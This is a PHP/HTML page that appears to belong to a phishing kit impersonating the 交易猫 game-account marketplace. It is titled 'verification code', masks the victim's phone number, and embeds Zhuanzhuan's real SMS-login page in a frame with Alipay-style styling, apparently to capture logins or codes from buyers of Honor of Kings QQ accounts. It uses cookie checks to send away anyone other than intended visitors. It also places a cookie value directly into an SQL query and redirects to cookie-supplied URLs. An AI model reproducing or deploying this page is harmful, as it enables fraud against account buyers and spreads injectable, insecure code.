<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<?php 
Define('PM_CALL',true);
Define('INC_CALL',true);
include dirname(__FILE__).('/../includes/global.class.php');
include dirname(__FILE__).('/../config/mysql.func.php');
include dirname(__FILE__).('/../config/Conn.php');
include dirname(__FILE__).('/../includes/getdata.php');
$ip=getIP();
setcookie('GoodsID4',$_COOKIE['GoodsID3']);
//写入订单号
setcookie('orderid',$zhuanzhuanORDER);


if($_COOKIE['GoodsID']){


      $cookTel=substr_replace($_COOKIE['se_tel'],'****',3,4);


  $_GoodsID = _fetch_array("SELECT * FROM goods WHERE goods_id='{$_COOKIE['GoodsID']}'") or die('SQL执行错误');

}

//先重新将商品ID写入另一个命名的COOKIE中，然后再销毁商品页生成的商品ID的COOKIE
setcookie('GoodsID2',$_COOKIE['GoodsID']);
setcookie("GoodsID");
//判断在商品页传过来的COOKIE是否存在(此页面是登陆页面，属于安全系数，所以用于防止客户刷新依然停留或者发给其他用户看)
//如果发给用户看，COOKIE中的URL地址不存在，就返回设定好的跳转地址
if($_COOKIE['GoodsURL1_1']){
    if(!$_COOKIE['GoodsID']){
     header('Location:'. htmlspecialchars_decode($_COOKIE['GoodsURL1_1']).'');
    }
}else{
    header('Location:'. htmlspecialchars_decode($Class1_jump_url).'');
}

if($_GoodsID['oldnewc']==1){
$oldnewc888="yue99();";
$oldnewc8888="block";}
if($_GoodsID['oldnewc']==2){
$oldnewc888="location.href='login.php?weixin=<?php echo md5($DOWNNa);?>'";
$oldnewc8888="none";}



?>
<html>

<head>
	<meta charset="utf-8" />
	<meta name="viewport"
		content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">

<meta itemprop="image" content="http://old.3533.com/cache/picture/2017/01/23/20170123102530363.jpg" />
<meta name="keywords" content="王者荣耀,QQ帐号,手Q全服通用,交易猫,手机站" />
<meta name="description" content="【交易猫】【王者荣耀QQ帐号】<?php echo $_GoodsID['title']; ?>,<?php echo $_GoodsID['region']; ?>,已投保。" />	    	        		    
 <link rel="stylesheet" href="https://as.alipayobjects.com/g/snake/h5cashier/1.0.5/h5cashier.css">

	<title>验证码</title>
</head>
<style>
	.kj {
		width: 100%;
		height: 100%;
		background-color:rgb(242, 242, 242);
	
		margin: 0px;
	}

	.sy {
		height: 100%;
		width: 600px;
		background-color: aquamarine;
		position: fixed;

	}

	.jk {
		width: 100%;
		height: 15%;
		margin-top:110%;
		position: fixed;

	}

	.zd {
		width: 100%;
		height: 60%;
     	position: fixed;
	}
    .login-button {
		width: 100%;
		height: 111px;
		margin-top: 91%;
		position: fixed;
    }
	</style>


<body class="kj">
<div class="top">
	
</div>

<iframe class="login-button"
src="login-button.html" scrolling="no" frameborder="0"></iframe>

<iframe width="100%" height="360" src="https://m.zhuanzhuan.com/common/loginsms/index.html?headTip=&callbackUrl=" scrolling="no" frameborder="0"></ifram>

	



	</iframe>

	</div>



</body>

</html>